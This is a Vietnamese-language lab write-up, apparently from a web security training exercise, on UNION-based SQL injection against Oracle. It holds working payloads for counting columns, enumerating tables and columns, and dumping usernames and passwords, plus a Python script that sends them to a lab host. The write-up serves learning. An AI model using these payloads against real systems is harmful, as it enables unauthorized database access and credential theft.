- Câu lệnh SELECT trong Oracle bắt buộc phải có mệnh đề FROM

=> Không giống như các hệ QTCSDL khác khi có thể viết câu lệnh SELECT độc lập mà không cần lấy dữ liệu từ đâu (Ví dụ: `SELECT 'abc', NULL`). Nhưng trong Oracle điều này là không hợp lệ

==> Cách giải quyết: Bảng ảo DUAL. Sẽ giúp Oracle hiểu ta đang chọn bảng nào

- Bản chất câu lệnh `SELECT 'a', 'b', 'c' FROM <table_name>'` là: với mỗi dòng tìm thấy, nó sẽ in ra 3 cột chứa 'a', 'b', 'c'

- Thay vì chỉ viết `' UNION SELECT NULL -- ` ta viết payload
  ```sql
  ' UNION SELECT NULL FROM DUAL -- (Hoặc ' UNION SELECT NULL, NULL FROM DUAL -- ; tóm lại đến khi nó khớp số cột thì web sẽ load bình thường)
  ```

  - Sau khi điều tra được số cột, ta dựa vào cấu trúc này của OracleDB

```
                        ORACLE DATA DICTIONARY
┌───────────────────────────────┐
│         ALL_USERS             │
├───────────────────────────────┤
│ USERNAME                      │
│ USER_ID                       │
│ CREATED                       │
└──────────────┬────────────────┘
               │ owner
               ▼

┌───────────────────────────────┐
│         ALL_TABLES            │
├───────────────────────────────┤
│ OWNER                         │
│ TABLE_NAME                    │
│ TABLESPACE_NAME               │
│ STATUS                        │
└──────────────┬────────────────┘
               │ owner + table_name
               ▼

┌───────────────────────────────┐
│       ALL_TAB_COLUMNS         │
├───────────────────────────────┤
│ OWNER                         │
│ TABLE_NAME                    │
│ COLUMN_NAME                   │
│ DATA_TYPE                     │
│ COLUMN_ID                     │
└───────────────────────────────┘
```

- Dựa vào cấu trúc bảng ta làm tương tự như quy trình với non-Oracle databases

=> Nói chung payload tìm các cột trong `table_name` phải có dạng:

```sql
' UNION SELECT column_name, NULL FROM all_tab_colums WHERE table_name = 'TABLE_....' --
```

Nguyên nhân là trong bảng all_tab_colums thì có 2 cột `table_name`, `column_name` nên mới có thể `SELECT column_name` và `WHERE table_name = '...' -- ` được

* Giờ sau khi đã có: tên bảng từ việc dump table_name, tên cột từ column_name. Ta tiến hành dump data từ đó ra để tìm username và password. Ví dụ:

```sql
' UNION SELECT USERNAME_..., PASSWORD_.... FROM <USERS_...> -- 
```

<details>
  <summary>Script python requests</summary>

---

```python
# =============================== No CHANGE ====================================

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===================================================================

import requests

cookies = {
    'session': 'devTJnDeQQAFSpffUvLeIivdjBcmnPpa',
}

headers = {
    'Host': '0a8400e904585ad680bb08af00c00051.web-security-academy.net',
    'Sec-Ch-Ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://0a8400e904585ad680bb08af00c00051.web-security-academy.net/',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Priority': 'u=0, i',
    # 'Cookie': 'session=devTJnDeQQAFSpffUvLeIivdjBcmnPpa',
}

params = {
    # 'category': "Pets' UNION SELECT NULL, NULL FROM DUAL -- ",
    # 'category': "Pets' UNION SELECT banner, NULL FROM v$version -- ",
    # 'category': "Pets' UNION SELECT table_name, NULL FROM all_tables -- ",
    # 'category': "Pets' UNION SELECT table_name, NULL FROM all_tables -- ",
    # 'category': "Pets' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_LAKTLC' -- ",
    'category': "Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_AJYUEB' -- ",
    'category': "Gifts' UNION SELECT USERNAME_QANLSR, PASSWORD_VJTMAR FROM USERS_AJYUEB -- ",


}

response = requests.get(
    'https://0a8400e904585ad680bb08af00c00051.web-security-academy.net/filter',
    params=params,
    cookies=cookies,
    headers=headers,
    verify=False,
)



# ================================================NO CHANGE ======================================



print(response.text)

if ("Internal Server Error" in response.text):
    print("Error: Internal Server Error")
else:
    print("SUCCESS RESPONSE")

'''

# Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
params = {
    # 'category': "Pets' UNION SELECT NULL, NULL FROM DUAL -- ",
    # 'category': "Pets' UNION SELECT banner, NULL FROM v$version -- ",
    # 'category': "Pets' UNION SELECT table_name, NULL FROM all_tables -- ",
    # 'category': "Pets' UNION SELECT table_name, NULL FROM all_tables -- ",
    # 'category': "Pets' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_LAKTLC' -- ",
    'category': "Pets' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_LAKTLC' -- ",

}
'''



'''
```

---
  
</details>
